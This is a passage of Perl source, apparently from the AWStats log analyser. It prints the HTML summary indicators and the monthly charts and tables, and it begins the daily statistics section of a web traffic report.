s/^&amp;//;\n\t$NewLinkParams =~ s/&amp;$//;\n\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\tmy $NewLinkTarget = '';\n\n\tif ( $FrameName eq 'mainright' ) {\n\t\t$NewLinkTarget = \" target=\\\"_parent\\\"\";\n\t}\n\n\t# Ratio\n\tmy $RatioVisits = 0;\n\tmy $RatioPages  = 0;\n\tmy $RatioHits   = 0;\n\tmy $RatioBytes  = 0;\n\tif ( $TotalUnique > 0 ) {\n\t\t$RatioVisits = int( $TotalVisits / $TotalUnique * 100 ) / 100;\n\t}\n\tif ( $TotalVisits > 0 ) {\n\t\t$RatioPages = int( $TotalPages / $TotalVisits * 100 ) / 100;\n\t}\n\tif ( $TotalVisits > 0 ) {\n\t\t$RatioHits = int( $TotalHits / $TotalVisits * 100 ) / 100;\n\t}\n\tif ( $TotalVisits > 0 ) {\n\t\t$RatioBytes =\n\t\t  int( ( $TotalBytes / 1024 ) * 100 /\n\t\t\t  ( $LogType eq 'M' ? $TotalHits : $TotalVisits ) ) / 100;\n\t}\n\n\tmy $colspan = 5;\n\tmy $w       = '20';\n\tif ( $LogType eq 'W' || $LogType eq 'S' ) {\n\t\t$w       = '17';\n\t\t$colspan = 6;\n\t}\n\n\t# Show first/last\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\tprint\n\"<td class=\\\"aws\\\"><b>$Message[133]</b></td><td class=\\\"aws\\\" colspan=\\\"\"\n\t  . ( $colspan - 1 ) . \"\\\">\\n\";\n\tprint( $MonthRequired eq 'all'\n\t\t? \"$Message[6] $YearRequired\"\n\t\t: \"$Message[5] \"\n\t\t  . $MonthNumLib{$MonthRequired}\n\t\t  . \" $YearRequired\"\n\t);\n\tprint \"</td></tr>\\n\";\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\tprint \"<td class=\\\"aws\\\"><b>$Message[8]</b></td>\\n\";\n\tprint \"<td class=\\\"aws\\\" colspan=\\\"\"\n\t  . ( $colspan - 1 ) . \"\\\">\"\n\t  . ( $FirstTime ? Format_Date( $FirstTime, 0 ) : \"NA\" ) . \"</td>\";\n\tprint \"</tr>\\n\";\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\">\";\n\tprint \"<td class=\\\"aws\\\"><b>$Message[9]</b></td>\\n\";\n\tprint \"<td class=\\\"aws\\\" colspan=\\\"\"\n\t  . ( $colspan - 1 ) . \"\\\">\"\n\t  . ( $LastTime ? Format_Date( $LastTime, 0 ) : \"NA\" )\n\t  . \"</td>\\n\";\n\tprint \"</tr>\\n\";\n\n\t# Show main indicators title row\n\tprint \"<tr>\";\n\tif ( $LogType eq 'W' || $LogType eq 'S' ) {\n\t\tprint \"<td bgcolor=\\\"#$color_TableBGTitle\\\">&nbsp;</td>\";\n\t}\n\tif ( $ShowSummary =~ /U/i ) {\n\t\tprint \"<td width=\\\"$w%\\\" bgcolor=\\\"#$color_u\\\"\"\n\t\t  . Tooltip(2)\n\t\t  . \">$Message[11]</td>\";\n\t}\n\telse {\n\t\tprint\n\"<td bgcolor=\\\"#$color_TableBGTitle\\\" width=\\\"20%\\\">&nbsp;</td>\";\n\t}\n\tif ( $ShowSummary =~ /V/i ) {\n\t\tprint \"<td width=\\\"$w%\\\" bgcolor=\\\"#$color_v\\\"\"\n\t\t  . Tooltip(1)\n\t\t  . \">$Message[10]</td>\";\n\t}\n\telse {\n\t\tprint\n\"<td bgcolor=\\\"#$color_TableBGTitle\\\" width=\\\"20%\\\">&nbsp;</td>\";\n\t}\n\tif ( $ShowSummary =~ /P/i ) {\n\t\tprint \"<td width=\\\"$w%\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t  . Tooltip(3)\n\t\t  . \">$Message[56]</td>\";\n\t}\n\telse {\n\t\tprint\n\"<td bgcolor=\\\"#$color_TableBGTitle\\\" width=\\\"20%\\\">&nbsp;</td>\";\n\t}\n\tif ( $ShowSummary =~ /H/i ) {\n\t\tprint \"<td width=\\\"$w%\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</td>\";\n\t}\n\telse {\n\t\tprint\n\"<td bgcolor=\\\"#$color_TableBGTitle\\\" width=\\\"20%\\\">&nbsp;</td>\";\n\t}\n\tif ( $ShowSummary =~ /B/i ) {\n\t\tprint \"<td width=\\\"$w%\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</td>\";\n\t}\n\telse {\n\t\tprint\n\"<td bgcolor=\\\"#$color_TableBGTitle\\\" width=\\\"20%\\\">&nbsp;</td>\";\n\t}\n\tprint \"</tr>\\n\";\n\n\t# Show main indicators values for viewed traffic\n\tprint \"<tr>\";\n\tif ( $LogType eq 'M' ) {\n\t\tprint \"<td class=\\\"aws\\\">$Message[165]</td>\";\n\t\tprint \"<td>&nbsp;<br />&nbsp;</td>\\n\";\n\t\tprint \"<td>&nbsp;<br />&nbsp;</td>\\n\";\n\t\tif ( $ShowSummary =~ /H/i ) {\n\t\t\tprint \"<td><b>\".Format_Number($TotalHits).\"</b>\"\n\t\t\t  . (\n\t\t\t\t$LogType eq 'M'\n\t\t\t\t? \"\"\n\t\t\t\t: \"<br />($RatioHits&nbsp;\"\n\t\t\t\t  . lc( $Message[57] . \"/\" . $Message[12] ) . \")\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\tif ( $ShowSummary =~ /B/i ) {\n\t\t\tprint \"<td><b>\"\n\t\t\t  . Format_Bytes( int($TotalBytes) )\n\t\t\t  . \"</b><br />($RatioBytes&nbsp;$Message[108]/\"\n\t\t\t  . $Message[ ( $LogType eq 'M' ? 149 : 12 ) ]\n\t\t\t  . \")</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t}\n\telse {\n\t\tif ( $LogType eq 'W' || $LogType eq 'S' ) {\n\t\t\tprint \"<td class=\\\"aws\\\">$Message[160]&nbsp;*</td>\";\n\t\t}\n\t\tif ( $ShowSummary =~ /U/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$MonthRequired eq 'all'\n\t\t\t\t? \"<b>&lt;= \".Format_Number($TotalUnique).\"</b><br />$Message[129]\"\n\t\t\t\t: \"<b>\".Format_Number($TotalUnique).\"</b><br />&nbsp;\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\tif ( $ShowSummary =~ /V/i ) {\n\t\t\tprint\n\"<td><b>\".Format_Number($TotalVisits).\"</b><br />($RatioVisits&nbsp;$Message[52])</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\tif ( $ShowSummary =~ /P/i ) {\n\t\t\tprint \"<td><b>\".Format_Number($TotalPages).\"</b><br />($RatioPages&nbsp;\"\n\t\t\t  . $Message[56] . \"/\"\n\t\t\t  . $Message[12]\n\t\t\t  . \")</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\tif ( $ShowSummary =~ /H/i ) {\n\t\t\tprint \"<td><b>\".Format_Number($TotalHits).\"</b>\"\n\t\t\t  . (\n\t\t\t\t$LogType eq 'M'\n\t\t\t\t? \"\"\n\t\t\t\t: \"<br />($RatioHits&nbsp;\"\n\t\t\t\t  . $Message[57] . \"/\"\n\t\t\t\t  . $Message[12] . \")\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\tif ( $ShowSummary =~ /B/i ) {\n\t\t\tprint \"<td><b>\"\n\t\t\t  . Format_Bytes( int($TotalBytes) )\n\t\t\t  . \"</b><br />($RatioBytes&nbsp;$Message[108]/\"\n\t\t\t  . $Message[ ( $LogType eq 'M' ? 149 : 12 ) ]\n\t\t\t  . \")</td>\";\n\t\t}\n\t\telse { print \"<td>&nbsp;</td>\"; }\n\t}\n\tprint \"</tr>\\n\";\n\n\t# Show main indicators values for not viewed traffic values\n\tif ( $LogType eq 'M' || $LogType eq 'W' || $LogType eq 'S' ) {\n\t\tprint \"<tr>\";\n\t\tif ( $LogType eq 'M' ) {\n\t\t\tprint \"<td class=\\\"aws\\\">$Message[166]</td>\";\n\t\t\tprint \"<td>&nbsp;<br />&nbsp;</td>\\n\";\n\t\t\tprint \"<td>&nbsp;<br />&nbsp;</td>\\n\";\n\t\t\tif ( $ShowSummary =~ /H/i ) {\n\t\t\t\tprint \"<td><b>\".Format_Number($TotalNotViewedHits).\"</b></td>\";\n\t\t\t}\n\t\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\t\tif ( $ShowSummary =~ /B/i ) {\n\t\t\t\tprint \"<td><b>\"\n\t\t\t\t  . Format_Bytes( int($TotalNotViewedBytes) )\n\t\t\t\t  . \"</b></td>\";\n\t\t\t}\n\t\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\t}\n\t\telse {\n\t\t\tif ( $LogType eq 'W' || $LogType eq 'S' ) {\n\t\t\t\tprint \"<td class=\\\"aws\\\">$Message[161]&nbsp;*</td>\";\n\t\t\t}\n\t\t\tprint \"<td colspan=\\\"2\\\">&nbsp;<br />&nbsp;</td>\\n\";\n\t\t\tif ( $ShowSummary =~ /P/i ) {\n\t\t\t\tprint \"<td><b>\".Format_Number($TotalNotViewedPages).\"</b></td>\";\n\t\t\t}\n\t\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\t\tif ( $ShowSummary =~ /H/i ) {\n\t\t\t\tprint \"<td><b>\".Format_Number($TotalNotViewedHits).\"</b></td>\";\n\t\t\t}\n\t\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\t\tif ( $ShowSummary =~ /B/i ) {\n\t\t\t\tprint \"<td><b>\"\n\t\t\t\t  . Format_Bytes( int($TotalNotViewedBytes) )\n\t\t\t\t  . \"</b></td>\";\n\t\t\t}\n\t\t\telse { print \"<td>&nbsp;</td>\"; }\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end($LogType eq 'W'\n\t\t  || $LogType eq 'S' ? \"* $Message[159]\" : \"\" );\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Monthly section on the main page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainMonthly{\n\tif ($Debug) { debug( \"ShowMonthStats\", 2 ); }\n\tprint \"$Center<a name=\\\"month\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[162]\";\n\t&tab_head( \"$title\", 0, 0, 'month' );\n\tprint \"<tr><td align=\\\"center\\\">\\n\";\n\tprint \"<center>\\n\";\n\n\tmy $average_nb = my $average_u = my $average_v = my $average_p = 0;\n\tmy $average_h = my $average_k = 0;\n\tmy $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;\n\tmy $max_v = my $max_p = my $max_h = my $max_k = 1;\n\n\t# Define total and max\n\tfor ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\t\t$total_u += $MonthUnique{ $YearRequired . $monthix } || 0;\n\t\t$total_v += $MonthVisits{ $YearRequired . $monthix } || 0;\n\t\t$total_p += $MonthPages{ $YearRequired . $monthix }  || 0;\n\t\t$total_h += $MonthHits{ $YearRequired . $monthix }   || 0;\n\t\t$total_k += $MonthBytes{ $YearRequired . $monthix }  || 0;\n\n#if (($MonthUnique{$YearRequired.$monthix}||0) > $max_v) { $max_v=$MonthUnique{$YearRequired.$monthix}; }\n\t\tif (\n\t\t\t( $MonthVisits{ $YearRequired . $monthix } || 0 ) > $max_v )\n\t\t{\n\t\t\t$max_v = $MonthVisits{ $YearRequired . $monthix };\n\t\t}\n\n#if (($MonthPages{$YearRequired.$monthix}||0) > $max_p)  { $max_p=$MonthPages{$YearRequired.$monthix}; }\n\t\tif ( ( $MonthHits{ $YearRequired . $monthix } || 0 ) > $max_h )\n\t\t{\n\t\t\t$max_h = $MonthHits{ $YearRequired . $monthix };\n\t\t}\n\t\tif ( ( $MonthBytes{ $YearRequired . $monthix } || 0 ) > $max_k )\n\t\t{\n\t\t\t$max_k = $MonthBytes{ $YearRequired . $monthix };\n\t\t}\n\t}\n\n\t# Define average\n\t# TODO\n\n\t# Show bars for month\n\tmy $graphdone=0;\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t{\n\t\tmy @blocklabel = ();\n\t\tfor ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\t\t\tpush @blocklabel,\n\t\t\t  \"$MonthNumLib{$monthix}\\n$YearRequired\";\n\t\t}\n\t\tmy @vallabel = (\n\t\t\t\"$Message[11]\", \"$Message[10]\",\n\t\t\t\"$Message[56]\", \"$Message[57]\",\n\t\t\t\"$Message[75]\"\n\t\t);\n\t\tmy @valcolor =\n\t\t  ( \"$color_u\", \"$color_v\", \"$color_p\", \"$color_h\",\n\t\t\t\"$color_k\" );\n\t\tmy @valmax = ( $max_v, $max_v, $max_h, $max_h, $max_k );\n\t\tmy @valtotal =\n\t\t  ( $total_u, $total_v, $total_p, $total_h, $total_k );\n\t\tmy @valaverage = ();\n\n\t\t#my @valaverage=($average_v,$average_p,$average_h,$average_k);\n\t\tmy @valdata = ();\n\t\tmy $xx      = 0;\n\t\tfor ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\t\t\t$valdata[ $xx++ ] = $MonthUnique{ $YearRequired . $monthix }\n\t\t\t  || 0;\n\t\t\t$valdata[ $xx++ ] = $MonthVisits{ $YearRequired . $monthix }\n\t\t\t  || 0;\n\t\t\t$valdata[ $xx++ ] = $MonthPages{ $YearRequired . $monthix }\n\t\t\t  || 0;\n\t\t\t$valdata[ $xx++ ] = $MonthHits{ $YearRequired . $monthix }\n\t\t\t  || 0;\n\t\t\t$valdata[ $xx++ ] = $MonthBytes{ $YearRequired . $monthix }\n\t\t\t  || 0;\n\t\t}\n\t\t\n\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t&$function(\n\t\t\t\"$title\",        \"month\",\n\t\t\t$ShowMonthStats, \\@blocklabel,\n\t\t\t\\@vallabel,      \\@valcolor,\n\t\t\t\\@valmax,        \\@valtotal,\n\t\t\t\\@valaverage,    \\@valdata\n\t\t);\n\t\t$graphdone=1;\n\t}\n\tif (! $graphdone)\n\t{\n\t\tprint \"<table>\\n\";\n\t\tprint \"<tr valign=\\\"bottom\\\">\";\n\t\tprint \"<td>&nbsp;</td>\\n\";\n\t\tfor ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\t\tmy $monthix  = sprintf( \"%02s\", $ix );\n\t\t\tmy $bredde_u = 0;\n\t\t\tmy $bredde_v = 0;\n\t\t\tmy $bredde_p = 0;\n\t\t\tmy $bredde_h = 0;\n\t\t\tmy $bredde_k = 0;\n\t\t\tif ( $max_v > 0 ) {\n\t\t\t\t$bredde_u =\n\t\t\t\t  int(\n\t\t\t\t\t( $MonthUnique{ $YearRequired . $monthix } || 0 ) /\n\t\t\t\t\t  $max_v * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_v > 0 ) {\n\t\t\t\t$bredde_v =\n\t\t\t\t  int(\n\t\t\t\t\t( $MonthVisits{ $YearRequired . $monthix } || 0 ) /\n\t\t\t\t\t  $max_v * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_p =\n\t\t\t\t  int(\n\t\t\t\t\t( $MonthPages{ $YearRequired . $monthix } || 0 ) /\n\t\t\t\t\t  $max_h * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_h =\n\t\t\t\t  int( ( $MonthHits{ $YearRequired . $monthix } || 0 ) /\n\t\t\t\t\t  $max_h * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_k > 0 ) {\n\t\t\t\t$bredde_k =\n\t\t\t\t  int(\n\t\t\t\t\t( $MonthBytes{ $YearRequired . $monthix } || 0 ) /\n\t\t\t\t\t  $max_k * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tprint \"<td>\";\n\t\t\tif ( $ShowMonthStats =~ /U/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vu'}\\\" height=\\\"$bredde_u\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[11]: \"\n\t\t\t\t\t  . ( $MonthUnique{ $YearRequired . $monthix }\n\t\t\t\t\t\t  || 0 ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /V/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vv'}\\\" height=\\\"$bredde_v\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[10]: \"\n\t\t\t\t\t  . ( $MonthVisits{ $YearRequired . $monthix }\n\t\t\t\t\t\t  || 0 ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /P/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vp'}\\\" height=\\\"$bredde_p\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[56]: \"\n\t\t\t\t\t  . ( $MonthPages{ $YearRequired . $monthix } || 0 )\n\t\t\t\t  )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /H/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vh'}\\\" height=\\\"$bredde_h\\\" width=\\\"6\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[57]: \"\n\t\t\t\t\t  . ( $MonthHits{ $YearRequired . $monthix } || 0 )\n\t\t\t\t  )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /B/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vk'}\\\" height=\\\"$bredde_k\\\" width=\\\"6\\\"\"\n\t\t\t\t\t  . AltTitle(\n\t\t\t\t\t\"$Message[75]: \"\n\t\t\t\t\t  . Format_Bytes(\n\t\t\t\t\t\t$MonthBytes{ $YearRequired . $monthix }\n\t\t\t\t\t  )\n\t\t\t\t  )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t\tprint \"<td>&nbsp;</td>\";\n\t\tprint \"</tr>\\n\";\n\n\t\t# Show lib for month\n\t\tprint \"<tr valign=\\\"middle\\\">\";\n\n\t\t#if (!$StaticLinks) {\n\t\t#\tprint \"<td><a href=\\\"\".XMLEncode(\"$AWScript${NewLinkParams}month=12&year=\".($YearRequired-1)).\"\\\">&lt;&lt;</a></td>\";\n\t\t#}\n\t\t#else {\n\t\tprint \"<td>&nbsp;</td>\";\n\n\t\t#\t\t\t\t}\n\t\tfor ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\n#\t\t\tif (!$StaticLinks) {\n#\t\t\t\tprint \"<td><a href=\\\"\".XMLEncode(\"$AWScript${NewLinkParams}month=$monthix&year=$YearRequired\").\"\\\">$MonthNumLib{$monthix}<br />$YearRequired</a></td>\";\n#\t\t\t}\n#\t\t\telse {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t!$StaticLinks\n\t\t\t\t  && $monthix == $nowmonth\n\t\t\t\t  && $YearRequired == $nowyear\n\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t: ''\n\t\t\t  );\n\t\t\tprint \"$MonthNumLib{$monthix}<br />$YearRequired\";\n\t\t\tprint(   !$StaticLinks\n\t\t\t\t  && $monthix == $nowmonth\n\t\t\t\t  && $YearRequired == $nowyear ? '</span>' : '' );\n\t\t\tprint \"</td>\";\n\n\t\t\t#\t\t\t\t\t}\n\t\t}\n\n#\t\tif (!$StaticLinks) {\n#\t\t\tprint \"<td><a href=\\\"\".XMLEncode(\"$AWScript${NewLinkParams}month=1&year=\".($YearRequired+1)).\"\\\">&gt;&gt;</a></td>\";\n#\t\t}\n#\t\telse {\n\t\tprint \"<td>&nbsp;</td>\";\n\n\t\t#\t\t\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tprint \"</table>\\n\";\n\t}\n\tprint \"<br />\\n\";\n\n\t# Show data array for month\n\tif ($AddDataArrayMonthStats) {\n\t\tprint \"<table>\\n\";\n\t\tprint\n\"<tr><td width=\\\"80\\\" bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[5]</td>\";\n\t\tif ( $ShowMonthStats =~ /U/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_u\\\"\"\n\t\t\t  . Tooltip(2)\n\t\t\t  . \">$Message[11]</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /V/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_v\\\"\"\n\t\t\t  . Tooltip(1)\n\t\t\t  . \">$Message[10]</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /P/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t\t  . Tooltip(3)\n\t\t\t  . \">$Message[56]</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /H/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t\t  . Tooltip(4)\n\t\t\t  . \">$Message[57]</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /B/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t\t  . Tooltip(5)\n\t\t\t  . \">$Message[75]</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tfor ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\t\t\tprint \"<tr>\";\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t!$StaticLinks\n\t\t\t\t  && $monthix == $nowmonth\n\t\t\t\t  && $YearRequired == $nowyear\n\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t: ''\n\t\t\t  );\n\t\t\tprint \"$MonthNumLib{$monthix} $YearRequired\";\n\t\t\tprint(   !$StaticLinks\n\t\t\t\t  && $monthix == $nowmonth\n\t\t\t\t  && $YearRequired == $nowyear ? '</span>' : '' );\n\t\t\tprint \"</td>\";\n\t\t\tif ( $ShowMonthStats =~ /U/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($MonthUnique{ $YearRequired . $monthix }\n\t\t\t\t  ? $MonthUnique{ $YearRequired . $monthix }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /V/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($MonthVisits{ $YearRequired . $monthix }\n\t\t\t\t  ? $MonthVisits{ $YearRequired . $monthix }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /P/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($MonthPages{ $YearRequired . $monthix }\n\t\t\t\t  ? $MonthPages{ $YearRequired . $monthix }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /H/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($MonthHits{ $YearRequired . $monthix }\n\t\t\t\t  ? $MonthHits{ $YearRequired . $monthix }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /B/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Bytes(\n\t\t\t\t\tint( $MonthBytes{ $YearRequired . $monthix } || 0 )\n\t\t\t\t  ), \"</td>\";\n\t\t\t}\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\n\t\t# Average row\n\t\t# TODO\n\t\t# Total row\n\t\tprint\n\"<tr><td bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[102]</td>\";\n\t\tif ( $ShowMonthStats =~ /U/i ) {\n\t\t\tprint\n\t\t\t  \"<td bgcolor=\\\"#$color_TableBGRowTitle\\\">\".Format_Number($total_u).\"</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /V/i ) {\n\t\t\tprint\n\t\t\t  \"<td bgcolor=\\\"#$color_TableBGRowTitle\\\">\".Format_Number($total_v).\"</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /P/i ) {\n\t\t\tprint\n\t\t\t  \"<td bgcolor=\\\"#$color_TableBGRowTitle\\\">\".Format_Number($total_p).\"</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /H/i ) {\n\t\t\tprint\n\t\t\t  \"<td bgcolor=\\\"#$color_TableBGRowTitle\\\">\".Format_Number($total_h).\"</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /B/i ) {\n\t\t\tprint \"<td bgcolor=\\\"#$color_TableBGRowTitle\\\">\"\n\t\t\t  . Format_Bytes($total_k) . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tprint \"</table>\\n<br />\\n\";\n\t}\n\n\tprint \"</center>\\n\";\n\tprint \"</td></tr>\\n\";\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Daily section on the main page\n# Parameters:   $firstdaytocountaverage, $lastdaytocountaverage\n#\t\t\t\t$firstdaytoshowtime, $lastdaytoshowtime\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainDaily{\n\tmy $firstdaytocountaverage = shift;\n\tmy $lastdaytocountaverage = shift;\n\tmy $firstdaytoshowtime = shift;\n\tmy $lastdaytoshowtime = shift;\n\t\n\tif ($Debug) { debug( \"ShowDaysOfMonthStats\", 2 ); }\n\tprint \"$Center<a name=\\\"daysofmonth\\\">&nbsp;</a><br />\\n\";\n\n\tmy $NewLinkParams = ${QueryString};\n\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t$NewLinkParams =~ s/^&amp;//;\n\t$NewLinkParams =~ s/&amp;$//;\n\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\tmy $NewLinkTarget = '';\n\n\tif ( $FrameName eq 'mainright' ) {\n\t\t$NewLinkTarget = \" target=\\\"_parent\\\"\";\n\t}\n\n\tmy $title = \"$Message[138]\";\n\n    if ($AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n        # extend the title to include the added link\n            $title = \"$title &nbsp; - &nbsp; <a href=\\\"\".(XMLEncode(\n                \"$AddLinkToExternalCGIWrapper\". \"?section=DAY&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n\n\t&tab_head( \"$title\", 0, 0, 'daysofmonth' );\n\tprint \"<tr>\";\n\tprint \"<td align=\\\"center\\\">\\n\";\n\tprint \"<center>\\n\";\n\t\n\tmy $average_v = my $average_p = 0;\n\tmy $average_h = my $average_k = 0;\n\tmy $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;\n\tmy $max_v = my $max_h = my $max_k = 0;    # Start from 0 because can be lower than 1\n\tforeach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t{\n\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\tmy $year  = $1;\n\t\tmy $month = $2;\n\t\tmy $day   = $3;\n\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\tnext;\n\t\t}    # If not an existing day, go to next\n\t\t$total_v += $DayVisits{ $year . $month . $day } || 0;\n\t\t$total_p += $DayPages{ $year . $month . $day }  || 0;\n\t\t$total_h += $DayHits{ $year . $month . $day }   || 0;\n\t\t$total_k += $DayBytes{ $year . $month . $day }  || 0;\n\t\tif ( ( $DayVisits{ $year . $month . $day } || 0 ) > $max_v ) {\n\t\t\t$max_v = $DayVisits{ $year . $month . $day };\n\t\t}\n\n#if (($DayPages{$year.$month.$day}||0) > $max_p)  { $max_p=$DayPages{$year.$month.$day}; }\n\t\tif ( ( $DayHits{ $year . $month . $day } || 0 ) > $max_h ) {\n\t\t\t$max_h = $DayHits{ $year . $month . $day };\n\t\t}\n\t\tif ( ( $DayBytes{ $year . $month . $day } || 0 ) > $max_k ) {\n\t\t\t$max_k = $DayBytes{ $year . $month . $day };\n\t\t}\n\t}\n    $average_v = sprintf( 